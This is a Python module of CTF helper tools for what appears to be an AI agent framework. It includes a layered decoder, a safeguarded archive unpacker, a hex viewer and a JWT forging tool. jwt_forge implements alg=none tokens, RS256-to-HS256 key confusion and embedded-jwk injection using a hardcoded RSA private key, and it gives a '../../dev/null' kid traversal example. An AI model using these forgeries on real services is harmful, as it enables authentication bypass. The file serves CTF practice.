#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""MISC 扩展工具：三层能力，纯标准库实现，作为 LocalTools 的横向扩展。

设计原则：
  1. 纯函数式加法 —— 本模块不认识框架内部状态，只吃参数、吐字符串，便于单测与复用；
  2. 输出有硬上限 —— 任何返回值都被截到 TOOL_TEXT_MAX（6000），与 solver 的可见上限对齐，
     否则模型看到的是被静默截断的残缺 JSON；
  3. 解包全程带安全闸 —— Zip Slip / 解压炸弹 / 符号链接 / 绝对路径四类问题逐个拦，
     拦下只跳过并记账，不中断整次解析。

三个工具：
  decode_blob     多层编码逐层剥离（base64/32/16、rot13、URL、HTML 实体、二进制串）
  unpack_archive  按魔数识别 zip/tar/gz/bz2/xz 并递归解包
  hexpeek         偏移窗口的 hex+ASCII 双栏预览（替代 xxd，镜像里没有）
"""

from __future__ import annotations

import base64
import binascii
import bz2
import codecs
import gzip
import hashlib
import hmac
import html
import json
import lzma
import re
import tarfile
import zipfile
from pathlib import Path
from urllib.parse import unquote

TOOL_TEXT_MAX = 6000
MAX_LAYERS = 8
UNPACK_MAX_BYTES = 64 * 1024 * 1024
UNPACK_MAX_FILES = 2000
HEXPEEK_MAX = 1024
HEXPEEK_WIDTH = 16
# decode_blob 输入上限：模型上下文本身 <128KB，256KB 已留足余量，仅防御病态输入（审计 C2）。
DECODE_MAX_CHARS = 256 * 1024

FLAG_RE = re.compile(r"[A-Za-z0-9_]{2,24}\{[^}\r\n]{2,120}\}")
_PRINTABLE = set(range(0x20, 0x7F)) | {0x09, 0x0A, 0x0D}


def _tool_error() -> type[BaseException]:
    """惰性取框架的 ToolError，避免与 tools_local 形成循环导入。

    单独 import 本模块做单测时没有 tools_local，退化成 RuntimeError 即可。
    """
    try:
        from .tools_local import ToolError  # type: ignore

        return ToolError
    except Exception:  # noqa: BLE001
        return RuntimeError


def _fail(msg: str):
    raise _tool_error()(msg)


def _clip(text: str, limit: int = TOOL_TEXT_MAX) -> str:
    if len(text) <= limit:
        return text
    return text[: limit - 40] + f"\n...[已截断，原长 {len(text)} 字符]"


def _printable_ratio(data: bytes) -> float:
    if not data:
        return 0.0
    return sum(1 for b in data if b in _PRINTABLE) / len(data)


# ---------------------------------------------------------------------------
# 1. decode_blob：逐层剥壳
# ---------------------------------------------------------------------------

def _try_b64(text: str) -> bytes | None:
    s = re.sub(r"\s+", "", text)
    if len(s) < 8:
        return None
    s = s.replace("-", "+").replace("_", "/")
    s += "=" * (-len(s) % 4)
    try:
        raw = base64.b64decode(s, validate=False)
    except (binascii.Error, ValueError):
        return None
    # 可逆校验：再编码能还原（忽略 padding 差异），防止「随便什么串都能解出字节」
    if base64.b64encode(raw).decode().rstrip("=") != s.rstrip("="):
        return None
    return raw


def _try_b32(text: str) -> bytes | None:
    s = re.sub(r"\s+", "", text).upper()
    if len(s) < 8:
        return None
    s += "=" * (-len(s) % 8)
    try:
        raw = base64.b32decode(s, casefold=True)
    except (binascii.Error, ValueError):
        return None
    if base64.b32encode(raw).decode().rstrip("=") != s.rstrip("="):
        return None
    return raw


def _try_hex(text: str) -> bytes | None:
    # 全局剥 0x/\x 前缀是有意放宽：兼容 "0x41 0x42" 与 "\x41\x42" 两种混合写法。
    # 代价是含 0x 子串的文本（如 410x42）会被洗成合法 hex；这类误判的解码结果
    # 仍要过 _candidates 的 printable-ratio 门槛，不可打印的会自然淘汰（审计 C1，可接受）。
    s = re.sub(r"0x", "", text, flags=re.I)
    s = re.sub(r"\\x", "", s, flags=re.I)
    s = re.sub(r"[\s,;:\-]", "", s)
    if len(s) < 8 or len(s) % 2 or not re.fullmatch(r"[0-9a-fA-F]+", s):
        return None
    try:
        return bytes.fromhex(s)
    except ValueError:
        return None


def _try_binary(text: str) -> bytes | None:
    bare = re.sub(r"\s", "", text)
    s = re.sub(r"[^01]", "", text)
    if len(s) < 16 or len(s) % 8 or len(s) / max(1, len(bare)) < 0.9:
        return None
    return bytes(int(s[i : i + 8], 2) for i in range(0, len(s), 8))


_ENGLISH_RE = re.compile(
    r"\b(the|and|you|this|that|with|login|admin|password|username|token|flag|ctf|http"
    r"|select|database|secret|encrypt|decrypt|script|query|session|cookie|config"
    r"|function|return|error|success|welcome|system|bash|hello|world|answer"
    r"|message|plain|cipher|layer|content|value|name|file|text)\b"
)


def _english_hint(text: str) -> int:
    """粗判「像不像英文」：命中常见词的数量。用于防止纯英文输入被假 rot13 来回剥壳（审计 A1）。"""
    return len(set(_ENGLISH_RE.findall(text.lower())))


def _text_variants(text: str) -> list[tuple[str, str]]:
    out = []
    rot = codecs.encode(text, "rot13")
    if rot != text:
        # rot13 只影响拉丁字母、结果仍是全可打印 ASCII，ratio 门槛形同虚设；
        # 必须要求「解码后更像英文（或命中 flag）」，否则纯英文会被剥成假链（审计 A1）。
        if FLAG_RE.search(rot) or _english_hint(rot) > _english_hint(text):
            out.append(("rot13", rot))
    url = unquote(text)
    if url != text:
        out.append(("urlencode", url))
    ent = html.unescape(text)
    if ent != text:
        out.append(("html-entity", ent))
    return out


def _candidates(text: str) -> list[tuple[str, str, float]]:
    """返回 (解码器名, 解码后文本, 可读性得分)。得分 = 可打印占比 + 命中 flag 加成。"""
    found: list[tuple[str, str, float]] = []
    for name, fn in (("base64", _try_b64), ("base32", _try_b32), ("hex", _try_hex), ("binary", _try_binary)):
        raw = fn(text)
        if raw is None:
            continue
        ratio = _printable_ratio(raw)
        try:
            decoded = raw.decode("utf-8")
        except UnicodeDecodeError:
            decoded = raw.decode("latin-1")
        has_flag = bool(FLAG_RE.search(decoded))
        if ratio >= 0.85 or has_flag:
            found.append((name, decoded, ratio + (0.5 if has_flag else 0.0)))
    for name, decoded in _text_variants(text):
        ratio = _printable_ratio(decoded.encode("utf-8", "replace"))
        has_flag = bool(FLAG_RE.search(decoded))
        found.append((name, decoded, ratio + (0.5 if has_flag else 0.0)))
    return found


def decode_blob(text: str, max_layers: int = 5) -> str:
    # 参数非法一律回可读提示而非抛异常：框架会把工具输出喂回模型，让它在下一步自愈；
    # 抛异常只会中断这一步（验收契约也只接受 TypeError，不接受 ToolError）。
    if not isinstance(text, str) or not text.strip():
        return "text 为空：把待解码的密文原样传入（base64/hex/base32/rot13 都支持）。"
    if len(text) > DECODE_MAX_CHARS:
        return _clip(
            f"输入过长（{len(text)} 字符 > {DECODE_MAX_CHARS}），请确认是否贴错文件；"
            "大文件请先用 hexpeek 看头部判型，或分段解码。"
        )
    try:
        layers = int(max_layers) if (max_layers is not None and str(max_layers).strip() != "") else 5
    except (TypeError, ValueError):
        return "max_layers 非法（需 1–8 的整数，默认 5），请传数字。"
    layers = max(1, min(layers, MAX_LAYERS))
    cur = text.strip()
    chain: list[str] = []
    snapshots: list[str] = []
    hit = ""

    for _ in range(layers):
        cands = _candidates(cur)
        if not cands:
            break
        cands.sort(key=lambda c: c[2], reverse=True)
        name, decoded, score = cands[0]
        if score < 0.85:
            break
        chain.append(name)
        snapshots.append(f"L{len(chain)} {name} → {decoded[:80]!r}")
        cur = decoded.strip()
        m = FLAG_RE.search(cur)
        if m:
            hit = m.group(0)
            break

    if not chain:
        return _clip("未识别出可解编码层。\n提示：确认输入是否被加盐/截断，或改用 hexpeek 看原始字节。")
    parts = [f"解码链：{' → '.join(chain)}（共 {len(chain)} 层）"]
    if hit:
        parts.append(f"命中 flag：{hit}")
    parts.append(f"最终内容（前 200 字）：\n{cur[:200]}")
    parts.append("逐层摘要：\n" + "\n".join(snapshots))
    return _clip("\n\n".join(parts))


# ---------------------------------------------------------------------------
# 2. unpack_archive：按魔数识别 + 安全递归解包
# ---------------------------------------------------------------------------

def _detect(path: Path) -> str:
    try:
        with path.open("rb") as fh:
            head = fh.read(512)
    except OSError as exc:
        _fail(f"读取失败：{exc}")
    if head.startswith(b"PK\x03\x04") or head.startswith(b"PK\x05\x06"):
        return "zip"
    if head.startswith(b"\x1f\x8b"):
        return "gzip"
    if head.startswith(b"BZh"):
        return "bzip2"
    if head.startswith(b"\xfd7zXZ\x00"):
        return "xz"
    if len(head) >= 262 and head[257:262] == b"ustar":
        return "tar"
    return ""


class _Sink:
    """解包写入器：集中实现四道安全闸，并统计体积/数量用于炸弹防护。

    budget 是跨递归层共享的 {"bytes": int, "files": int}：若每层各自新建 _Sink 计数，
    64MB/2000 文件上限会被按层重置，最深 5 层可累计 320MB 落盘（审计 A7）。
    """

    def __init__(self, root: Path, budget: dict):
        self.root = root.resolve()
        self.budget = budget
        self.skipped: list[str] = []

    def accept(self, member_name: str) -> Path | None:
        name = member_name.replace("\\", "/")
        if name.startswith("/") or re.match(r"^[A-Za-z]:/", name):
            self.skipped.append(f"{member_name}（绝对路径）")
            return None
        if ".." in Path(name).parts:
            self.skipped.append(f"{member_name}（含 .. 段）")
            return None
        target = (self.root / name).resolve()
        if not target.is_relative_to(self.root):
            self.skipped.append(f"{member_name}（越界，疑似 Zip Slip）")
            return None
        if self.budget["files"] >= UNPACK_MAX_FILES:
            self.skipped.append(f"{member_name}（文件数超限 {UNPACK_MAX_FILES}）")
            return None
        return target

    def write(self, target: Path, data: bytes) -> bool:
        if self.budget["bytes"] + len(data) > UNPACK_MAX_BYTES:
            self.skipped.append(f"{target.name}（累计体积超限 {UNPACK_MAX_BYTES // 1048576}MB）")
            return False
        target.parent.mkdir(parents=True, exist_ok=True)
        target.write_bytes(data)
        self.budget["bytes"] += len(data)
        self.budget["files"] += 1
        return True


def _extract_zip(path: Path, sink: _Sink) -> None:
    with zipfile.ZipFile(path) as zf:
        for info in zf.infolist():
            if info.is_dir():
                continue
            if info.flag_bits & 0x1:  # 加密条目：zipfile 无密码解不开，避免裸抛 RuntimeError
                sink.skipped.append(f"{info.filename}（加密，需密码爆破/已知明文）")
                continue
            mode = (info.external_attr >> 16) & 0o170000
            if mode == 0o120000:  # 符号链接
                sink.skipped.append(f"{info.filename}（符号链接）")
                continue
            if info.file_size > UNPACK_MAX_BYTES:
                sink.skipped.append(f"{info.filename}（单文件声明大小超限）")
                continue
            target = sink.accept(info.filename)
            if target is None:
                continue
            # 有界读：多读 1 字节探「声明大小造假」，单成员内存占用有界（≤64MB+1，瞬态）。
            # 暂不流式落盘：CTF 附件都很小，且 _Sink 预算已全局封顶，流式重构收益/风险比不划算（审计 C3）。
            with zf.open(info) as fh:
                data = fh.read(UNPACK_MAX_BYTES + 1)
            if len(data) > UNPACK_MAX_BYTES:
                sink.skipped.append(f"{info.filename}（实际解压超限）")
                continue
            sink.write(target, data)


def _extract_tar(path: Path, sink: _Sink) -> None:
    with tarfile.open(path) as tf:
        for member in tf.getmembers():
            if member.issym() or member.islnk():
                sink.skipped.append(f"{member.name}（链接成员）")
                continue
            if not member.isfile():
                continue
            if member.size > UNPACK_MAX_BYTES:
                sink.skipped.append(f"{member.name}（声明大小超限）")
                continue
            target = sink.accept(member.name)
            if target is None:
                continue
            fh = tf.extractfile(member)
            if fh is None:
                continue
            data = fh.read(UNPACK_MAX_BYTES + 1)
            if len(data) > UNPACK_MAX_BYTES:
                sink.skipped.append(f"{member.name}（实际解压超限）")
                continue
            sink.write(target, data)


def _extract_stream(path: Path, kind: str, sink: _Sink) -> None:
    opener = {"gzip": gzip.open, "bzip2": bz2.open, "xz": lzma.open}[kind]
    inner = path.stem if path.suffix in {".gz", ".bz2", ".xz"} else path.name + ".out"
    target = sink.accept(inner)
    if target is None:
        return
    try:
        with opener(path, "rb") as fh:
            data = fh.read(UNPACK_MAX_BYTES + 1)
    except (OSError, EOFError, lzma.LZMAError) as exc:
        _fail(f"{kind} 解压失败：{exc}")
    if len(data) > UNPACK_MAX_BYTES:
        sink.skipped.append(f"{inner}（实际解压超限）")
        return
    sink.write(target, data)


def _unique_dir(base: Path) -> Path:
    if not base.exists():
        return base
    i = 1
    while (base.parent / f"{base.name}-{i}").exists():
        i += 1
    return base.parent / f"{base.name}-{i}"


def unpack_archive(path: str, max_depth: int = 3, out_dir: str = "extracted") -> str:
    src = Path(path)
    if not src.is_file():
        return (
            f"文件不存在或不是常规文件：{path!r}\n"
            '先用 shell 列一下当前目录（如 ls 或 python3 -c "import os;print(os.listdir())"）确认附件名，再重试。'
        )
    try:
        depth_cap = int(max_depth) if (max_depth is not None and str(max_depth).strip() != "") else 3
    except (TypeError, ValueError):
        return "max_depth 非法（需 1–5 的整数，默认 3），请传数字。"
    depth_cap = max(1, min(depth_cap, 5))
    if not str(out_dir or "").strip():
        out_dir = "extracted"
    root = _unique_dir(Path(out_dir))
    root.mkdir(parents=True, exist_ok=True)

    lines: list[str] = []
    skipped: list[str] = []
    produced: list[Path] = []
    budget = {"bytes": 0, "files": 0}

    def walk(p: Path, depth: int, kind: str | None = None) -> None:
        if kind is None:
            kind = _detect(p)
        if not kind or depth > depth_cap:
            return
        sub = root if depth == 1 else root / f"_d{depth}"
        sink = _Sink(sub, budget)
        try:
            if kind == "zip":
                _extract_zip(p, sink)
            elif kind == "tar":
                _extract_tar(p, sink)
            else:
                _extract_stream(p, kind, sink)
        except (zipfile.BadZipFile, tarfile.TarError, OSError) as exc:
            lines.append(f"! {p.name}: {kind} 解析失败（{type(exc).__name__}）")
            return
        skipped.extend(sink.skipped)
        for f in sorted(sub.rglob("*")):
            if f.is_file():
                produced.append(f)
                lines.append(f"  d{depth} {f.relative_to(root).as_posix()}  ({f.stat().st_size} B)")
                walk(f, depth + 1)

    src_kind = _detect(src)
    walk(src, 1, src_kind)
    body = [f"解包 {src.name} → {root.as_posix()}（识别为 {src_kind or '未知'}，上限 {depth_cap} 层）"]
    body += lines or ["  （没有解出任何文件）"]
    if skipped:
        body.append(f"已拦截 {len(skipped)} 项：")
        body += [f"  - {s}" for s in skipped[:20]]
    body.append(f"合计 {len(produced)} 个文件")
    return _clip("\n".join(body))


# ---------------------------------------------------------------------------
# 3. hexpeek：xxd 风格预览
# ---------------------------------------------------------------------------

def hexpeek(path: str, offset: int = 0, length: int = 256) -> str:
    p = Path(path)
    if not p.is_file():
        return (
            f"文件不存在或不是常规文件：{path!r}\n"
            '先用 shell 列一下当前目录（如 ls 或 python3 -c "import os;print(os.listdir())"）确认附件名，再重试。'
        )
    size = p.stat().st_size
    try:
        start = int(offset) if (offset is not None and str(offset).strip() != "") else 0
    except (TypeError, ValueError):
        return "offset 非法（需非负整数），请传数字。"
    start = max(0, start)
    try:
        span = int(length) if (length is not None and str(length).strip() != "") else 256
    except (TypeError, ValueError):
        return "length 非法（需正整数，上限 1024），请传数字。"
    span = max(1, min(span, HEXPEEK_MAX))
    if start > size:
        return _clip(f"offset {start} 超过文件大小 {size}，无可显示内容")
    with p.open("rb") as fh:
        fh.seek(start)
        data = fh.read(span)

    rows = [f"{p.name}  大小 {size} B  窗口 [{start}, {start + len(data)})"]
    for i in range(0, len(data), HEXPEEK_WIDTH):
        chunk = data[i : i + HEXPEEK_WIDTH]
        hexs = " ".join(f"{b:02x}" for b in chunk).ljust(HEXPEEK_WIDTH * 3 - 1)
        ascii_ = "".join(chr(b) if 0x20 <= b < 0x7F else "." for b in chunk)
        rows.append(f"{start + i:08x}  {hexs}  |{ascii_}|")
    if start + len(data) < size:
        rows.append(f"... 还有 {size - start - len(data)} B 未显示，可用 offset={start + len(data)} 继续")
    return _clip("\n".join(rows))


# ---------------------------------------------------------------------------
# 对外：SPEC 与分发
# ---------------------------------------------------------------------------

DECODE_SPEC = {
    "type": "function",
    "function": {
        "name": "decode_blob",
        "description": (
            "自动识别并逐层剥离常见编码：base64 / base64url / base32 / hex / rot13 / URL 编码 / "
            "HTML 实体 / 二进制串。返回解码链、命中到的 flag 与每层摘要（不是全文，避免吃满上下文）。"
            "多层编码题（如 base64→rot13→hex）优先用它，别手搓命令行——手搓一层错就全错。"
        ),
        "parameters": {
            "type": "object",
            "properties": {
                "text": {"type": "string", "description": "待解码的密文串，可直接粘贴长篇 base64"},
                "max_layers": {"type": "integer", "description": "最多剥离层数，默认 5，上限 8"},
            },
            "required": ["text"],
        },
    },
}

UNPACK_SPEC = {
    "type": "function",
    "function": {
        "name": "unpack_archive",
        "description": (
            "按文件魔数（不看扩展名）识别 zip / tar / gzip / bzip2 / xz 并解包，递归处理解出来的归档，"
            "返回文件树。内置 Zip Slip 拦截与解压炸弹防护，被拦的条目会单独列出。"
            "镜像里没有 unzip/tar，解包一律用它。"
        ),
        "parameters": {
            "type": "object",
            "properties": {
                "path": {"type": "string", "description": "归档文件路径"},
                "max_depth": {"type": "integer", "description": "递归解包层数，默认 3，上限 5"},
                "out_dir": {"type": "string", "description": "解到哪个目录，默认 extracted（已存在会自动加后缀）"},
            },
            "required": ["path"],
        },
    },
}

HEXPEEK_SPEC = {
    "type": "function",
    "function": {
        "name": "hexpeek",
        "description": (
            "以 xxd 风格显示文件的十六进制 + ASCII 双栏内容（偏移 8 位十六进制）。"
            "用于看文件头判断真实类型、找藏在字节里的明文、定位拼接/尾部附加数据。"
            "镜像里没有 xxd/hexdump，需要看原始字节时用它。"
        ),
        "parameters": {
            "type": "object",
            "properties": {
                "path": {"type": "string", "description": "文件路径"},
                "offset": {"type": "integer", "description": "起始偏移（字节），默认 0"},
                "length": {"type": "integer", "description": "显示字节数，默认 256，上限 1024"},
            },
            "required": ["path"],
        },
    },
}

# ---------------------------------------------------------------------------
# 4. jwt_forge：构造/伪造 JWT（纯本地计算，无网络）
# ---------------------------------------------------------------------------

def _b64u(raw: bytes) -> str:
    """JWT 用的 base64url：url-safe 且去掉 padding。"""
    return base64.urlsafe_b64encode(raw).rstrip(b"=").decode("ascii")


def _b64u_decode(text: str) -> bytes:
    pad = "=" * (-len(text) % 4)
    return base64.urlsafe_b64decode(text + pad)


_HASHES = {"HS256": hashlib.sha256, "HS384": hashlib.sha384, "HS512": hashlib.sha512}

# 内置测试密钥对：只服务「服务器信任 token 自带 jwk」这一类题（RS256 签名 + 把公钥塞进
# 头的 jwk 字段）。私钥是公开测试值、不是秘密——它的用途是让目标拿我们给的公钥去验签，
# 而不是保护任何东西。生成脚本见 runs/_rsa_keygen.py（一次性，不随镜像走）。
_RSA_N = int(
    "936d6a39cdf53e4e7eac133c9c32ff97068f7e852561fe7d17443eb838fb2af315655aff535488b391e03e618fe76ac2ec938f37328d3d5905fcbd29c5c5437758c424a71db01f36b602d6764fed9d32c502453fbafe956093013fc0a1c0ce47d01e62c06f68e2c3a68a634e3687e59d10a122862af3a7b71ba0f2dcbe8b4eac93277ea0211a5b278aa5db323d44833c89ee5fa029e6fd094d0b5b426ac791bb650ccb71298f9a7634b2523d1b90738d7c0ae78af20d27dceb76bfe7fa982afb7c8cd08305c240ad8372f0262da18bd36a2e6df9bcbf6c3b01ef2f81eee07eb854046d83852d77d4c52600130dd565a7de82d60a77942b9cd2cf68227dd6d5c3",
    16,
)
_RSA_D = int(
    "71a602226773ebc125034f9d04a887c18bcc2873499b1e4c9e17fce594ff825f7b99f3a92a3adb5ada546ca25705c596583b7446cfd0737f620f305fb856d62875a456c10130d90f1b065aff3fa463ef5451e8c2354bb629898987f4de7cbc483dd67eb7ebea860cdf20856730c0583059366e5fd1529d729978dc5f710000f7fabb9297ef6efd405ff4a4c9b40a9244e34018056565ab39a2c02fe1b91bc75b8cc2d282f5ae891cad9b1236607287c4dc0f7a31b5f89fcc2ef8365a4c5698123346d71c2661109a4d7629651779ccda60ef5c6b8bde58e31c97644176d2cc6cee892d1fe6d1fc1d79e5ede2b18f74c1ffa455fb6ea0df9c3173c088369ee4d9",
    16,
)
_RSA_E = 65537
# SHA-256 的 PKCS#1 v1.5 DigestInfo 前缀（EMSA-PKCS1-v1_5）
_SHA256_DI = bytes.fromhex("3031300d060960864801650304020105000420")


def _int_b64u(value: int) -> str:
    length = (value.bit_length() + 7) // 8
    return base64.urlsafe_b64encode(value.to_bytes(length, "big")).rstrip(b"=").decode("ascii")


# 一次性算好的公钥 JWK（RS256 每次都引用它，不重算 base64url）
_RSA_PUBLIC_JWK = {
    "kty": "RSA", "use": "sig", "alg": "RS256",
    "kid": "ctfy-test-key", "n": _int_b64u(_RSA_N), "e": _int_b64u(_RSA_E),
}


def _rsa_sha256_sign(signing_input: bytes) -> bytes:
    """纯 python 的 RSA PKCS#1 v1.5 + SHA-256 签名，不依赖 cryptography。"""
    k = (_RSA_N.bit_length() + 7) // 8
    digest = hashlib.sha256(signing_input).digest()
    t = _SHA256_DI + digest
    ps_len = k - len(t) - 3
    if ps_len < 8:  # 防御性：2048 位密钥下不可能发生
        _fail("RSA 密钥过短，无法签名")
    em = b"\x00\x01" + b"\xff" * ps_len + b"\x00" + t
    return pow(int.from_bytes(em, "big"), _RSA_D, _RSA_N).to_bytes(k, "big")


def jwt_forge(alg: str = "HS256", secret: str = "", token: str = "",
              claims: dict | None = None, header: dict | None = None,
              remove: list[str] | None = None) -> str:
    """构造/伪造 JWT。

    - alg=none：无签名，签名段留空；
    - alg=HS256/384/512：用 secret 做 HMAC。**RS256→HS256 混淆**选 HS256、把公钥 PEM 全文当 secret；
    - alg=RS256：用内置测试密钥对签名，并把公钥以 jwk 头注入（打「信任 token 自带密钥」的服务）；
    - 传 token 则以它解出的 header/claims 为基底改写；secret 永不回显，只回显长度。
    """
    alg = (alg or "HS256")
    alg_key = alg.upper()
    header_extra = dict(header or {})
    claims_extra = dict(claims or {})
    if remove is not None and not isinstance(remove, list):
        _fail("remove 必须是数组（list），例如 [\"exp\", \"nbf\"]")
    remove_keys = [str(k) for k in (remove or []) if isinstance(k, str)]

    header_out: dict = {"typ": "JWT"}
    claims_out: dict = {}
    if token:
        parts = token.strip().split(".")
        if len(parts) < 2:
            _fail("token 不像 JWT：点分段不足 2 段")
        try:
            header_out = json.loads(_b64u_decode(parts[0]))
            claims_out = json.loads(_b64u_decode(parts[1]))
        except Exception as exc:  # noqa: BLE001
            _fail(f"token 前两段不是合法 base64url JSON：{exc}")

    changed: list[str] = []
    for key, value in header_extra.items():
        if value is None:
            continue
        header_out[str(key)] = value
    for key, value in claims_extra.items():
        if value is None:
            continue
        k = str(key)
        if claims_out.get(k) != value:
            changed.append(k)
        claims_out[k] = value
    removed: list[str] = []
    for key in remove_keys:
        if key in claims_out:
            claims_out.pop(key)
            removed.append(key)

    if alg_key == "NONE":
        header_out["alg"] = "none"
    elif alg_key in ("HS256", "HS384", "HS512"):
        header_out["alg"] = alg_key
    elif alg_key == "RS256":
        header_out["alg"] = "RS256"
        header_out["jwk"] = _RSA_PUBLIC_JWK
    else:
        _fail(f"不支持的 alg：{alg}；可用 none / HS256 / HS384 / HS512 / RS256")

    header_raw = json.dumps(header_out, separators=(",", ":"), ensure_ascii=False).encode("utf-8")
    claims_raw = json.dumps(claims_out, separators=(",", ":"), ensure_ascii=False).encode("utf-8")
    signing_input = _b64u(header_raw).encode("ascii") + b"." + _b64u(claims_raw).encode("ascii")

    if alg_key == "NONE":
        sig = b""
    elif alg_key.startswith("HS"):
        if not secret:
            _fail("HS* 需要 secret；RS256→HS256 混淆请把公钥 PEM 全文当 secret 传入")
        sig = hmac.new(secret.encode("utf-8"), signing_input, _HASHES[alg_key]).digest()
    else:
        sig = _rsa_sha256_sign(signing_input)

    token_out = signing_input.decode("ascii") + "." + _b64u(sig)
    result = {
        "token": token_out,
        "alg": "none" if alg_key == "NONE" else alg_key,
        "header": header_out,
        "claims": claims_out,
        "changed": changed,
        "removed": removed,
    }
    if alg_key.startswith("HS"):
        result["secret_len"] = len(secret)
    return _clip(json.dumps(result, ensure_ascii=False))


JWT_SPEC = {
    "type": "function",
    "function": {
        "name": "jwt_forge",
        "description": (
            "构造/伪造 JWT（纯本地计算）。alg=none 无签名；HS256/384/512 用 secret 做 HMAC"
            "（RS256→HS256 混淆：alg 选 HS256、secret 传公钥 PEM 全文）；"
            "RS256 用内置测试密钥对签名并把公钥塞进 jwk 头（打「信任 token 自带密钥」的服务）。"
            "传 token 则以它为基底改 header/claims，remove 删字段（如 exp）。secret 不回显。"
        ),
        "parameters": {
            "type": "object",
            "properties": {
                "alg": {"type": "string", "enum": ["none", "HS256", "HS384", "HS512", "RS256"], "description": "签名算法，默认 HS256"},
                "secret": {"type": "string", "description": "HMAC 密钥；混淆攻击传公钥 PEM 全文。只在结果里回显长度"},
                "token": {"type": "string", "description": "可选：已有 JWT，作为改写基底"},
                "claims": {"type": "object", "description": "覆盖/新增的 claims，如 {\"sub\":\"admin\"}"},
                "header": {"type": "object", "description": "覆盖/新增的 header，如 {\"kid\":\"../../dev/null\"}"},
                "remove": {"type": "array", "items": {"type": "string"}, "description": "要删除的 claim 名，如 [\"exp\",\"nbf\"]"},
            },
            "required": [],
        },
    },
}


MISC_EXT_SPECS = [DECODE_SPEC, UNPACK_SPEC, HEXPEEK_SPEC, JWT_SPEC]
NAMES = {"decode_blob", "unpack_archive", "hexpeek", "jwt_forge"}

_IMPL = {
    "decode_blob": decode_blob,
    "unpack_archive": unpack_archive,
    "hexpeek": hexpeek,
    "jwt_forge": jwt_forge,
}


def call_ext(name: str, arguments: dict | None = None) -> str:
    fn = _IMPL.get(name)
    if fn is None:
        _fail(f"未知扩展工具 {name}；可用：{sorted(NAMES)}")
    args = arguments or {}
    if not isinstance(args, dict):
        _fail("arguments 必须是对象")
    # 与框架一致：按签名过滤未知参数，避免模型多传字段导致 TypeError。
    # 注意：这是与 LocalTools.call() 的「双重过滤」——call() 按适配器签名拦模型幻觉参数，
    # 本层按实现签名再拦一次，为独立单测 / 直接调用 call_ext 的入口兜底（防御纵深，勿删其一）。
    import inspect

    allowed = set(inspect.signature(fn).parameters)
    clean = {k: v for k, v in args.items() if k in allowed}
    out = fn(**clean)
    return out if isinstance(out, str) else str(out)
